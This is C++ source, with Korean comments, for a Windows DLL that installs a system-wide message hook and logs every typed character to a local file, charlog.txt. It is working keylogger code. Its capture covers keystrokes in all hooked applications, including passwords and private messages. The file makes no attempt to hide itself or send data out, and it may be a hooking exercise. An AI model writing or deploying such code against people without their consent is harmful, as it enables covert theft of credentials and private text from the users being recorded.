#include <windows.h>
#include <stdio.h>

HINSTANCE g_hInstance = NULL;
HHOOK g_hHook = NULL;
FILE* logFile;

// DLL 진입점
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved) {
    switch (dwReason) {
    case DLL_PROCESS_ATTACH:
        g_hInstance = hinstDLL;
        break;
    case DLL_PROCESS_DETACH:
        if (logFile) {
            fclose(logFile);
        }
        break;
    }
    return TRUE;
}

// 윈도우 메시지 후킹 프로시저
LRESULT CALLBACK GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == PM_REMOVE) {  // 유효한 메시지만 처리
        MSG* pMsg = (MSG*)lParam;

        // 문자 입력 메시지 (WM_CHAR)만 처리
        if (pMsg->message == WM_CHAR) {
            if (logFile) {
                // 입력된 문자를 로그 파일에 기록
                fprintf(logFile, "Character Entered: %c\n", (char)pMsg->wParam);
                fflush(logFile);  // 버퍼를 즉시 파일에 기록
            }
        }
    }
    // 다음 후킹 프로시저에 전달
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

extern "C" __declspec(dllexport) void HookStart() {
    // 로그 파일 생성
    fopen_s(&logFile, "charlog.txt", "a");
    if (!logFile) {
        MessageBoxW(NULL, L"Failed to open log file.", L"Error", MB_OK);
        return;
    }

    // 시스템 전체에서 메시지 후킹을 설정
    g_hHook = SetWindowsHookEx(WH_GETMESSAGE, GetMsgProc, g_hInstance, 0);
    if (!g_hHook) {
        MessageBoxW(NULL, L"Failed to set hook.", L"Error", MB_OK);
    }
}

extern "C" __declspec(dllexport) void HookStop() {
    // 후킹 해제
    if (g_hHook) {
        UnhookWindowsHookEx(g_hHook);
        g_hHook = NULL;
    }

    // 로그 파일 닫기
    if (logFile) {
        fclose(logFile);
        logFile = NULL;
    }
}